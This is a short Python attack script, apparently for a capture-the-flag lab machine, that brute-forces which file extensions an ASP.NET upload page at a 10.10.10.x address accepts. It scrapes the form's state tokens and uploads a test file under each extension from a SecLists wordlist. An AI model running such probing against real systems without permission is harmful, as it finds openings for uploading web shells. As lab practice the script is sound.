#!/usr/bin/python3

from pwn import *
import pdb
import sys
import re
import requests

# ctrl + c
def def_handler(sig,frame):
    print("\n[!] Saliendo...\n")
    sys.exit(1)
signal.signal(signal.SIGINT, def_handler)

# Variables globales 
upload_url = "http://10.10.10.93/transfer.aspx"

# Funciones
def uploadFile(extension):
    
    s = requests.session()
    r = s.get(upload_url)

    viewState = re.findall(r'id="__VIEWSTATE" value="(.*?)"', r.text)[0]
    eventValidation = re.findall(r'id="__EVENTVALIDATION" value="(.*?)"', r.text)[0]

    data = {
        '__VIEWSTATE': viewState,
        '__EVENTVALIDATION': eventValidation,   
        'btnUpload': 'Upload'
    }

    file = {'FileUpload1': ('prueba%s' % extension, 'hola, esta es una prueba')}

    r = s.post(upload_url, files=file, data=data)
    
    if "Invalid File. Please try again" not in r.text:
        log.success("La extension %s es valida" % extension)

if __name__ == "__main__":
    
    p1 = log.progress("Iniciando ataque de fuerza bruta")
    p1.status("Extenciones")
    f = open("/usr/share/SecLists/Discovery/Web-Content/raft-large-extensions-lowercase.txt", "rb")
    
    time.sleep(2)

    for extension in f:
        
        extension = extension.decode().strip()
        p1.status("Probando extension: %s" % extension)
        uploadFile(extension)
